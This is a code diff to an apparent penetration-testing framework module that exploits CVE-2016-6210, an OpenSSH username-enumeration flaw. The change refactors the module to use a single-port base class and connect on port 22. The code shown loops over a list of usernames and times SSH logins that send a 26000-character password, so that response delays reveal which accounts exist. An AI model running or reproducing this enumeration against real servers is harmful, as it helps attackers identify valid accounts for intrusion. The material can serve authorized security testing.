@@ -1,6 +1,6 @@
 # CVE-2016-6210
 
-from jframework.modules.model import Module
+from jframework.modules.model import ModuleSinglePort
 import time
 hasParamiko = True
 try:
@@ -9,11 +9,12 @@ except:
     hasParamiko = False
 
 
-class Openssh(Module):
+class Openssh(ModuleSinglePort):
 
     def __init__(self):
         super(Openssh, self).__init__()
         self.userFile = "jframework/files/users.txt"
+        self.single_port = 22
 
     def users(self, u):
         self.userFile = u
@@ -40,7 +41,7 @@ class Openssh(Module):
             time1 = time.clock()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             try:
-                client.connect(self.host, username=line, password=(26000 * 'J'), timeout=2)
+                client.connect(hostname=self.host, port=self.single_port, username=line, password=(26000 * 'J'), timeout=2)
             except Exception as e:
                 elements = ["timed out", "is not subscriptable" ]
 
